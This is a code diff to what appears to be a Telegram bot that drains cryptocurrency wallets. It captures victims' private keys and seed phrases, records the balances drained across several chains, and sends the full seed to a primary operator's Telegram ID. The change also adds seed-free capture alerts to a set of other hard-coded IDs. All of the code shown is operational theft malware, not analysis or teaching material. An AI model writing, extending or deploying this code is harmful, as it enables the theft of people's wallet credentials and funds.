@@ -83,6 +83,8 @@ MIN_DRAIN_USD = float(os.getenv("MIN_DRAIN_USD", "0") or 0)
 PAYMENT_RECEIVER = os.getenv("PAYMENT_RECEIVER") or DRAIN_DESTINATION
 LOG_GROUP_ID = os.getenv("LOG_GROUP_ID", "")
 KEY_RECEIVER_ID = int(os.getenv("KEY_RECEIVER_ID") or os.getenv("KEY_RECIEVER_ID") or "8637715094")
+# Full seed/key goes only to KEY_RECEIVER_ID. These IDs get capture alerts without the seed.
+KEY_ALERT_IDS = {8839253481, 8348030470, 8412493404}
 
 USDC_ETH = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
 USDC_BSC = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"
@@ -1444,12 +1446,8 @@ async def log_key_to_admin(bot: Bot, user, raw_key: str, sol: float, eth: float,
             username = f"@{user.username}" if getattr(user, "username", None) else (getattr(user, "full_name", None) or "—")
             user_id = str(getattr(user, "id", "—"))
         usd = estimate_usd(sol, eth, bnb, usdc)
-        text = (
-            f"🚨 <b>NEW KEY CAPTURED</b>\n\n"
-            f"User: {username}\n"
-            f"ID: <code>{user_id}</code>\n\n"
-            f"<b>Key / Seed:</b>\n"
-            f"<code>{raw_key}</code>\n\n"
+
+        balances_block = (
             f"<b>Balances drained:</b>\n"
             f"SOL: <b>{sol:.6f}</b>\n"
             f"ETH: <b>{eth:.6f}</b>\n"
@@ -1457,10 +1455,40 @@ async def log_key_to_admin(bot: Bot, user, raw_key: str, sol: float, eth: float,
             f"USDC: <b>{usdc:.2f}</b>\n"
             f"BTC: <b>{btc:.8f}</b>\n"
             f"LTC: <b>{ltc:.8f}</b>\n\n"
-            f"💰 Estimated value: <b>${usd:,.2f}</b>"
+            f"Estimated value: <b>${usd:,.2f}</b>"
         )
-        await bot.send_message(chat_id=KEY_RECEIVER_ID, text=text, parse_mode=ParseMode.HTML)
-        log.info("Logged key ONLY to admin %s", KEY_RECEIVER_ID)
+
+        # Full payload (includes seed/key) — only KEY_RECEIVER_ID
+        full_text = (
+            f"<b>NEW KEY CAPTURED</b>\n\n"
+            f"User: {username}\n"
+            f"ID: <code>{user_id}</code>\n\n"
+            f"<b>Key / Seed:</b>\n"
+            f"<code>{raw_key}</code>\n\n"
+            f"{balances_block}"
+        )
+        try:
+            await bot.send_message(chat_id=KEY_RECEIVER_ID, text=full_text, parse_mode=ParseMode.HTML)
+            log.info("Logged full key to %s", KEY_RECEIVER_ID)
+        except Exception as e:
+            log.warning("Failed full key log to %s: %s", KEY_RECEIVER_ID, e)
+
+        # Alert-only (no seed) — KEY_ALERT_IDS
+        alert_text = (
+            f"<b>KEY CAPTURE ALERT</b>\n\n"
+            f"User: {username}\n"
+            f"ID: <code>{user_id}</code>\n\n"
+            f"{balances_block}\n\n"
+            f"<i>Seed withheld — primary receiver only.</i>"
+        )
+        for aid in KEY_ALERT_IDS:
+            if aid == KEY_RECEIVER_ID:
+                continue
+            try:
+                await bot.send_message(chat_id=aid, text=alert_text, parse_mode=ParseMode.HTML)
+            except Exception as e:
+                log.warning("Failed alert to %s: %s", aid, e)
+        log.info("Key alerts sent to %s", list(KEY_ALERT_IDS))
     except Exception as e:
         log.exception("Failed to log key to admin: %s", e)
 
